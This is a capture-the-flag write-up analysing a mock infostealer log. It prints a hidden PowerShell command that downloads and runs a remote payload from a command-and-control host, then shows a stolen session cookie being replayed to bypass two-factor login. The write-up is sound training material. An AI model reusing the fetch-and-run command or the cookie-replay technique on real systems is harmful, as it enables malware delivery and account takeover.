# Flare CTF #6 writeup
## this is my writeup for the sixth challenge of the Flare CTF

I first downloaded and unzipped the given file which gave me the file "FREE-LOGZ".  

This appears to be some sort of stealer log, with the following contents:  

```
Applications  Chrome         Combo.txt         Screen.png    System.txt
Brute.txt     Clipboard.txt  DomainDetect.txt  Software.txt  User.txt
```

I first decided to take a look at Screen.png and Clipboard.txt  

These are screen captures and the contents of the clipboard when the stealer executed. Screen.png shows a "fake capcha attack" where the victim pastes in an obfuscated command to their terminal and another open tab, "technotunez".  

The contents of Clipboard.txt were:
```
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vY2MtbWFzdGVyLmZsci9wYXlsb2FkLnBzMScpOw==
```
When base64 decoded, the encoded command is:
```
iex (New-Object Net.WebClient).DownloadString('http://cc-master.flr/payload.ps1');
```
This shows that the clipboard, like the screenshot, is also of the moment the stealer executed. The command downloads this file in memory and uses powershell to execute the stealer script.  

The next thing I decided to look at was Applications, but that only had a discord file, containing JWT-looking token (which I later learned is actually the form for discord tokens). This however was just a distraction, and not needed for the final solution.  

After that, I looked into the Chrome directory, which contained 2 user profiles, each with their respective cookies, passwords, and history.txt files  

Given this, and the presence of System.txt with hardware information, I initially assumed the challenge would involve account takeover with fingerprint replication using anti-detect.  

Looking into the files for each user, I saw that most of the sites were appended ".flr or .crf" so I used the following grep command on all the files in there to look for anything ending in ".com":

```bash
grep -R ".com" .
```
Which returned:
```
./Profile 2/History.txt:URL: https://technotunez.com/
./Profile 2/History.txt:URL: https://technotunez.com/about.php
./Profile 2/History.txt:URL: https://technotunez.com/pricing.php
./Profile 2/History.txt:URL: https://technotunez.com/login.php
./Profile 2/History.txt:URL: https://technotunez.com/login.php?error=1
./Profile 2/History.txt:URL: https://technotunez.com/login.php
./Profile 2/History.txt:URL: https://technotunez.com/mfa.php
./Profile 2/History.txt:URL: https://technotunez.com/mfa.php?resend=true
./Profile 2/History.txt:URL: https://technotunez.com/dashboard.php
./Profile 2/History.txt:URL: https://technotunez.com/dashboard.php?welcome=true
./Profile 2/History.txt:TITLE: Dashboard · Welcome Back
./Profile 2/History.txt:URL: https://technotunez.com/analytics.php
```
The site "https://technotunez[.]com/" is what showed up a lot, and going to the site myself revealed a login page.  

I first tried using the username/password combo from the log but got stuck on 2fa, so I looked for cookies and found the following:  

```
.technotunez.com TRUE    /   TRUE    1766332822  session 0xjparks.ai5wYXJrczpsb2dnZWRpbg
.technotunez.com TRUE    /   TRUE    1766332822  analytics false
```
The "session" cookie's payload is encoded base64 and decodes to "j.parks:loggedin"  

By creating and using the session cookie myself, even without anti-detect, I was able to get past the login and the site returned the flag:

Flag: flare{c00k13_m0nst3r_logz_992}
